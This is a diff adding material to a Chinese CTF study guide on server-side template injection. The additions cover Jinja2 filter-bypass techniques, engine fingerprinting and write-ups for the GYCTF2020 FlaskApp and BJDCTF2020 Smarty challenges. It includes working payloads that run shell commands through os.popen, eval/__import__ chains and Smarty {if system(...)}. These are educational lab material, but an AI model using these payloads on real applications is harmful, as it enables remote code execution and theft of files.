@@ -1,4 +1,4 @@
-# SSTI 模板注入专题
+﻿# SSTI 模板注入专题
 
 > **数据越界变成了代码。**SQL 里是逃出引号，模板里是逃出 `{{ }}`。
 
@@ -328,6 +328,87 @@ a|f(x)     ≈  f(a, x)
 
 **遇到"沙箱"报错时，先确认它到底是真沙箱，还是应用层做了关键词替换。**两者绕法完全不同。
 
+### 7.5 实战：五种过滤，五种换法
+
+**下面每一条都是真打过的，不是设想。**
+
+#### ① 拦下划线 `_`
+
+**`__class__`、`__globals__` 全都带下划线，一个都写不出来。**
+
+**换法：名字不从模板里写，从**另一个参数**偷运过来。**
+
+```text
+?name={{''|attr(request.args.a)|attr(request.args.b)|first}}&a=__class__&b=__bases__
+```
+
+**过滤器只检查 `name`，`a`、`b` 是通道。**`name` 里一个下划线都没有。
+
+#### ② 拦 `{{ }}`
+
+**连输出括号都不给了。**
+
+**换法：Jinja 还有 `{% %}` 语句，其中 `print` 就是用来输出的（Jinja 3 才有）。**
+
+```jinja
+{% print(''|attr(...)) %}
+```
+
+**备选：`{% filter %}` 能处理包在里面的字面量。**
+
+#### ③ 拦关键词（`class` / `globals` / `attr` / `os`）
+
+**换法：把词拆开，让原文里不出现完整的那串字母。**
+
+```jinja
+{{''['__cla'+'ss__']}}          →  <class 'str'>
+```
+
+**为什么必须用方括号：点号后面只能跟**字面名字**，没法拼接；`attr` 又可能一起被拦。**
+
+#### ④ 子串匹配的坑：拆词时每一段都要检查
+
+**拦截是**子串**匹配。所以：**
+
+```text
+{{'host'}}   →  no no no      ← host 里含 os
+{{'pas'}}    →  pas           ← 干净
+```
+
+**拆词不能只看"整体不出现"，要看**每一段**。**`'this_is_the_fl'+'ag.txt'` 两段都干净；`'cat /etc/host'+'name'` 第一段就中招了。**
+
+#### ⑤ 根本不是 Jinja
+
+**`{{7*7}}` 回 49 就往下走，会走错路——**Smarty 也回 49**。**
+
+**换法：先换引擎，再换语法。**
+
+```text
+{{7*'7'}}     →  7777777 = Jinja2     49 = PHP 系（Smarty/Twig）
+{$smarty.version}  →  3.1.34          Smarty 的内置变量
+```
+
+**Smarty 3 没有 `{php}` 标签了，但有 `{if}`：**
+
+```text
+{if phpinfo()}{/if}     ← Smarty 把 {if 表达式} 编译成 PHP 的 if (...)
+{if system('ls /')}{/if}
+```
+
+**注意 `{if}` 只判真假不输出，所以要挑**自己会 echo** 的函数（`phpinfo`、`system`、`readfile`）。**
+
+### 7.6 判断顺序（卡住时按这个走）
+
+```text
+① 三种反馈：空白 / 500 / 有内容        →  先定性质
+② {{7*'7'}}                            →  先定引擎
+③ 单独包一个词去测：{{'xxx'}}           →  定黑名单粒度
+④ 换形状 or 换引擎 or 拼接             →  按上面的表选一个
+```
+
+**第③步最有用：把可疑的词一个一个包成 `{{'词'}}` 发过去，哪个回 `no no honey`/`no hack` 就是哪个。**比整条 payload 试错快十倍。
+
+
 ---
 
 ## 八、工具
@@ -379,6 +460,43 @@ fenjing webui         # 图形界面
 ```
 
 **完整过程见 [WP](/blog/bjdctf2-fake-google-ssti/)。**
+
+### [GYCTF2020] FlaskApp
+
+**解密功能把结果当模板渲染；有黑名单，但 `+` 没被拦。**
+
+```text
+被拦：*  eval  os  popen  system  import  request  subprocess  flag
+```
+
+**两条路都要先 `ls /` 找文件名，再 `cat`：**
+
+```jinja
+# 短路
+{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
+
+# 长链（eval 版，双层拆分：Jinja 一层 + Python 一层）
+{{(...['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
+```
+
+**这题还教了一件事：POST 之后 302 重定向，结果存在 session 里——"没回显"其实是 JSON 在下一页。**
+
+**完整过程见 [WP](/blog/gyctf2020-flaskapp-ssti/)。**
+
+### [BJDCTF2020] The mystery of ip
+
+**不是 Jinja，是 Smarty（PHP）。**
+
+```text
+注入点在 X-Forwarded-For（不在参数里）
+{{7*'7'}} → 49          确认是 PHP 系
+{$smarty.version} → 3.1.34
+{if phpinfo()}{/if}      Smarty 3 的函数调用入口
+{if system('cat /flag')}{/if}
+```
+
+**完整过程见 [WP](/blog/bjdctf2020-mystery-of-ip-smarty/)。**
+
 
 ---
 
